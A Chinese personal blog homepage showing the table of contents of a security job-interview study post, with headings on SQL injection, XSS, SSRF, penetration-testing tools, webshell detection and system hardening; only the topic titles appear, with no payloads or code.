<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"acindm.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Welcome to the 1&#x2F;30000 🫧">
<meta property="og:type" content="website">
<meta property="og:title" content="acind の blog">
<meta property="og:url" content="https://acindm.github.io/index.html">
<meta property="og:site_name" content="acind の blog">
<meta property="og:description" content="Welcome to the 1&#x2F;30000 🫧">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://acindm.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>acind の blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">acind の blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">3</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2024/03/25/%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/25/%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95/" class="post-title-link" itemprop="url">技术面试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-03-25 10:29:00 / 修改时间：10:29:26" itemprop="dateCreated datePublished" datetime="2024-03-25T10:29:00+08:00">2024-03-25</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>50 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li><a href="#%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98">技术面试问题</a><ul>
<li><a href="#ctf">CTF</a><ul>
<li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%AA%E5%8D%B0%E8%B1%A1%E6%B7%B1%E5%88%BB%E7%9A%84ctf%E7%9A%84%E9%A2%98%E7%9B%AE">说一个印象深刻的CTF的题目</a><ul>
<li><a href="#sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">sql二次注入</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#python">Python</a><ul>
<li><a href="#%E7%88%AC%E8%99%AB%E6%A8%A1%E5%9D%97%E6%A1%86%E6%9E%B6%E5%8F%8D%E7%88%AC%E8%99%AB%E6%9C%BA%E5%88%B6ip-%E4%BB%A3%E7%90%86%E6%B1%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%A0%B4%E8%A7%A3ua">爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</a></li>
<li><a href="#%E5%B9%B6%E5%8F%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%8D%8F%E7%A8%8B%E4%B8%89%E4%B8%AA%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB">并发(多线程、线程池、协程、三个程之间的区别)</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%A0%87%E5%87%86%E5%BA%93">常用的标准库</a></li>
<li><a href="#django%E5%92%8Cflask%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%BF%E7%94%A8">DJANGO和FLASK区别和使用</a></li>
<li><a href="#orm">ORM</a></li>
<li><a href="#python%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">python安全工具编写&#x2F;源码阅读</a></li>
<li><a href="#%E8%AF%81%E6%98%8E%E8%83%BD%E5%8A%9B">证明能力</a></li>
</ul>
</li>
<li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a><ul>
<li><a href="#rsa">RSA</a></li>
<li><a href="#des">DES</a></li>
<li><a href="#aes">AES</a></li>
<li><a href="#%E5%9B%BD%E5%86%85sm%E7%B3%BB%E5%88%97">国内SM系列</a></li>
</ul>
</li>
<li><a href="#%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0">风险评估</a><ul>
<li><a href="#%E6%B5%81%E7%A8%8B">流程</a></li>
<li><a href="#%E4%B8%89%E8%A6%81%E7%B4%A0">三要素</a></li>
</ul>
</li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a><ul>
<li><a href="#fority-sca%E5%AE%A1%E8%AE%A1java%E4%BB%A3%E7%A0%81">Fority SCA审计JAVA代码</a></li>
<li><a href="#seay%E5%AE%A1%E8%AE%A1php%E4%BB%A3%E7%A0%81">Seay审计PHP代码</a></li>
<li><a href="#%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">源码阅读</a></li>
</ul>
</li>
<li><a href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B">应急响应具体流程</a><ul>
<li><a href="#%E6%A8%A1%E5%9E%8B">模型</a></li>
<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a><ul>
<li><a href="#ddos">DDOS</a><ul>
<li><a href="#ddos%E6%98%AF%E4%BB%80%E4%B9%88">DDOS是什么</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E4%BE%8B-1">实例</a></li>
<li><a href="#%E4%B8%BB%E6%9C%BA%E8%A2%AB%E5%85%A5%E4%BE%B5">主机被入侵</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E7%9B%B8%E5%85%B3">渗透测试流程相关</a><ul>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B">渗透测试流程</a></li>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE">渗透测试项目</a></li>
<li><a href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%B7%E4%BD%93%E5%AE%9E%E6%96%BD">渗透测试具体实施</a></li>
<li><a href="#17%E5%B9%B4owasp-top10">17年OWASP TOP10</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">常见的Web安全漏洞</a></li>
<li><a href="#%E6%8C%96%E8%BF%87%E4%BB%80%E4%B9%88%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">挖过什么逻辑漏洞</a><ul>
<li><a href="#%E8%AE%A2%E5%8D%95%E4%BB%BB%E6%84%8F%E9%87%91%E9%A2%9D%E4%BF%AE%E6%94%B9">订单任意金额修改</a></li>
<li><a href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E4%BC%A0">验证码回传</a></li>
<li><a href="#%E6%9C%AA%E8%BF%9B%E8%A1%8C%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81%E9%AA%8C%E8%AF%81">未进行登陆凭证验证</a></li>
<li><a href="#%E6%8E%A5%E5%8F%A3%E6%97%A0%E9%99%90%E5%88%B6%E6%9E%9A%E4%B8%BE">接口无限制枚举</a></li>
<li><a href="#cookie%E8%AE%BE%E7%BD%AE%E5%AD%98%E5%9C%A8%E7%BC%BA%E9%99%B7">cookie设置存在缺陷</a></li>
</ul>
</li>
<li><a href="#%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E7%BC%BA%E9%99%B7">找回密码功能缺陷</a></li>
<li><a href="#%E4%BD%A0%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E6%98%AF%E5%93%AA%E4%B8%AA">你常用的渗透工具有哪些，最常用的是哪个？</a><ul>
<li><a href="#%E6%89%AB%E6%8F%8Fnessusawvsnikto">扫描:Nessus,AWVS,Nikto</a></li>
<li><a href="#sqlmap">SQLmap</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#metasploit">Metasploit</a></li>
<li><a href="#hydra">Hydra</a></li>
<li><a href="#kali%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">kali信息收集工具</a></li>
<li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90wireshark">流量分析WireShark</a></li>
</ul>
</li>
<li><a href="#%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%AA%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6%E8%BF%87%E7%9A%84cve%E6%88%96pocms17-010%E6%9C%80%E6%96%B0%E7%9A%84cve">描述一个你深入研究过的CVE或POC(ms17-010&#x2F;最新的CVE)</a></li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5">数据库注入</a><ul>
<li><a href="#mysql%E9%9D%A2%E8%AF%95%E9%A2%98">MySQL面试题</a><ul>
<li><a href="#mysql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E">MySQL存储引擎？</a></li>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%8B%E5%8A%A1">什么是事务？</a></li>
<li><a href="#%E8%AF%BB%E9%94%81%E5%92%8C%E5%86%99%E9%94%81">读锁和写锁</a></li>
<li><a href="#mysql%E7%9A%84%E7%B4%A2%E5%BC%95">MySQL的索引</a></li>
<li><a href="#order-by%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%9A%84%E8%BF%90%E7%94%A8">ORDER BY在注入的运用</a></li>
<li><a href="#gpc%E6%98%AF%E4%BB%80%E4%B9%88gpc%E4%B9%8B%E5%90%8E%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87">GPC是什么？GPC之后怎么绕过？</a></li>
<li><a href="#mysql%E4%B8%80%E4%B8%AA%E5%92%8C%E4%B8%A4%E4%B8%AA%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">Mysql一个@和两个@什么区别</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0">注入&#x2F;绕过常用的函数</a></li>
<li><a href="#mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B">MySQL存储过程</a></li>
<li><a href="#%E5%90%84%E7%A7%8D%E5%86%99shell%E7%9A%84%E9%97%AE%E9%A2%98">各种写shell的问题</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B">注入类型</a></li>
<li><a href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86">SQL注入的原理</a></li>
<li><a href="#%E8%BF%87waf">过waf</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1">如何进行SQL注入的防御</a></li>
<li><a href="#mysql%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A550%E4%BB%A5%E4%B8%8A%E5%92%8C50%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
<li><a href="#sql%E5%92%8Cnosql%E7%9A%84%E5%8C%BA%E5%88%AB">SQL和NoSQL的区别</a><ul>
<li><a href="#sql%E4%BC%98%E7%82%B9">SQL优点</a></li>
<li><a href="#sql%E7%BC%BA%E7%82%B9">SQL缺点</a></li>
<li><a href="#nosql%E4%BC%98%E7%82%B9">NoSQL优点</a></li>
<li><a href="#%E6%AF%94%E8%BE%83">比较</a></li>
<li><a href="#mongodb%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">MongoDB注入方式</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xss-csrf-xxe">XSS CSRF XXE</a><ul>
<li><a href="#csrf-%E5%92%8C-xss-%E5%92%8C-xxe-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F">CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</a></li>
<li><a href="#csrfssrf%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">CSRF、SSRF和重放攻击有什么区别？</a></li>
<li><a href="#%E5%95%A5%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E8%B7%A8%E5%9F%9F%E6%9C%89%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F">啥是同源策略，跨域有几种方式？</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">如何规避同源策略？</a><ul>
<li><a href="#jsonp">JSONP</a><ul>
<li><a href="#jsonp%E7%9A%84%E5%8A%AB%E6%8C%81">JSONP的劫持</a></li>
</ul>
</li>
<li><a href="#websocket">WebSocket</a></li>
<li><a href="#cors%E9%87%8D%E7%82%B9">CORS(重点)</a><ul>
<li><a href="#%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83">与JSONP的比较</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dom-xss%E4%B8%8E%E5%8F%8D%E5%B0%84xss%E6%9C%89%E5%95%A5%E4%B8%8D%E5%90%8C%EF%BC%8C%E7%BB%99%E4%BD%A010s%EF%BC%8C%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AAxss%E6%98%AF%E5%90%A6%E6%98%AFdom-xss%EF%BC%9F">DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</a></li>
<li><a href="#csp%E7%AD%96%E7%95%A5">CSP策略</a></li>
<li><a href="#ssrf%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%97%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E4%BC%AA%E5%8D%8F%E8%AE%AE">SSRF漏洞原理是什么？利用时有哪些伪协议？</a><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li>
<li><a href="#ssrf%E7%94%A8%E5%A4%84">ssrf用处</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%84">漏洞处</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">绕过姿势</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE">利用协议</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li>
</ul>
</li>
<li><a href="#%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AB%AFreferer%E5%8F%AF%E4%BB%A5%E7%AF%A1%E6%94%B9%E5%90%97">在浏览器端，Referer可以篡改吗？</a></li>
<li><a href="#xss%E7%9B%B2%E6%89%93%E5%88%B0%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%88%A9%E7%94%A8">xss盲打到内网服务器的利用</a></li>
<li><a href="#xss%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1">xss代码层防御</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">文件上传下载遍历漏洞</a><ul>
<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
<li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">修复方案</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含漏洞</a><ul>
<li><a href="#%E7%B1%BB%E5%9E%8B">类型</a></li>
<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0">PHP文件包含函数</a></li>
<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
<li><a href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-1">修复方案</a></li>
</ul>
</li>
<li><a href="#web%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%BC%B1%E7%82%B9">web框架漏洞弱点</a><ul>
<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B3%A8%E5%85%A5%E4%B9%8Bflask%E6%A1%86%E6%9E%B6%E4%B8%AD%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98">服务端注入之Flask框架中服务端模板注入问题</a></li>
</ul>
</li>
<li><a href="#http%E5%8D%8F%E8%AE%AE">HTTP协议</a><ul>
<li><a href="#tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">TCP三次握手四次挥手</a><ul>
<li><a href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B">三次握手</a></li>
<li><a href="#%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">四次挥手</a></li>
</ul>
</li>
<li><a href="#%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B">四层模型</a></li>
<li><a href="#%E5%BD%93%E4%BD%A0%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E7%82%B9%E5%87%BB%E8%AE%BF%E9%97%AE%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88">当你输入一个网址，点击访问，会发生什么？</a><ul>
<li><a href="#%E6%9F%A5%E6%89%BEdns%E8%AE%B0%E5%BD%95">查找DNS记录</a></li>
<li><a href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5">建立连接</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81">常见的状态码</a></li>
<li><a href="#osi%E4%B8%83%E5%B1%82">OSI七层</a><ul>
<li><a href="#osi%E5%9B%9B%E5%B1%82">OSI四层</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE">路由协议</a><ul>
<li><a href="#%E4%BD%A0%E6%90%AD%E5%BB%BA%E8%BF%87%E7%9A%84%E6%9C%80%E5%A4%8D%E6%9D%82%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%98%AF%E4%BB%80%E4%B9%88">你搭建过的最复杂的网络设备是什么</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E8%BF%87%E4%BB%80%E4%B9%88%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87">使用过什么硬件设备</a></li>
</ul>
</li>
<li><a href="#linux%E8%BF%90%E7%BB%B4">Linux运维</a><ul>
<li><a href="#%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B">启动过程</a></li>
<li><a href="#linux%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83">Linux基线规范</a><ul>
<li><a href="#%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86%E5%92%8C%E6%8E%88%E6%9D%83">账号管理和授权</a></li>
<li><a href="#%E6%9C%8D%E5%8A%A1">服务</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a></li>
<li><a href="#%E6%97%A5%E5%BF%97">日志</a></li>
<li><a href="#ip%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E8%A6%81%E6%B1%82">IP协议安全要求</a></li>
</ul>
</li>
<li><a href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83apache">中间件基线规范（APACHE）</a><ul>
<li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li>
<li><a href="#%E7%A6%81%E6%AD%A2">禁止</a></li>
<li><a href="#%E9%9A%90%E8%97%8F">隐藏</a></li>
<li><a href="#%E5%88%A0%E9%99%A4">删除</a></li>
</ul>
</li>
<li><a href="#webshell%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF">webshell检测思路</a><ul>
<li><a href="#%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B">静态检测</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E6%A3%80%E6%B5%8B">动态检测</a></li>
<li><a href="#%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B">日志检测</a></li>
<li><a href="#%E8%AF%AD%E6%B3%95%E6%A3%80%E6%B5%8B">语法检测</a></li>
<li><a href="#%E7%BB%9F%E8%AE%A1%E5%AD%A6%E6%A3%80%E6%B5%8B">统计学检测</a></li>
<li><a href="#%E9%98%B2%E8%8C%83webshell">防范webshell</a></li>
</ul>
</li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li>
<li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E7%BC%96%E5%86%99%E8%BF%87%E4%BB%80%E4%B9%88%E8%84%9A%E6%9C%AC">自动化运维编写过什么脚本</a></li>
<li><a href="#yum%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E6%BA%90%E6%9C%AC%E5%9C%B0%E8%87%AA%E6%90%AD%E6%8C%82%E8%BD%BD">yum用的什么源（本地自搭，挂载）</a></li>
<li><a href="#awk-sed%E7%9A%84%E4%BD%BF%E7%94%A8">awk sed的使用</a></li>
<li><a href="#%E6%8E%92%E9%94%99%E6%80%9D%E8%B7%AF%E6%8E%92%E9%94%99%E7%BB%8F%E9%AA%8C">排错思路，排错经验</a></li>
<li><a href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90elk%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%88%86%E6%9E%90">日志分析ELK的使用和分析</a><ul>
<li><a href="#%E4%BA%8B%E4%BB%B6%E5%8F%91%E7%94%9F%E7%9A%84%E5%88%86%E6%9E%90">事件发生的分析</a></li>
</ul>
</li>
<li><a href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9">用户权限管理(修改)</a></li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></li>
<li><a href="#ipsec-vpn">IPsec VPN</a></li>
<li><a href="#%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7">安全监控工具</a></li>
<li><a href="#linux%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80">Linux木马查杀</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%BE%E5%A4%87%E6%9C%89%E5%95%A5">常见的设备有啥</a></li>
</ul>
</li>
<li><a href="#windows%E8%BF%90%E7%BB%B4">Windows运维</a><ul>
<li><a href="#%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83">基线规范</a></li>
<li><a href="#%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80">木马查杀</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1">计划任务</a></li>
</ul>
</li>
<li><a href="#iso27000%E5%92%8C%E7%AD%89%E4%BF%9D%E9%87%8D%E7%82%B9%E7%AD%89%E4%BF%9D">ISO27000和等保(重点等保)</a><ul>
<li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%8Biso27000">说一下ISO27000</a></li>
<li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%8B%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%88%B6%E5%BA%A6">说一下等级保护制度</a></li>
<li><a href="#%E5%B7%AE%E5%BC%82">差异</a></li>
<li><a href="#%E5%85%B1%E6%80%A7">共性</a></li>
</ul>
</li>
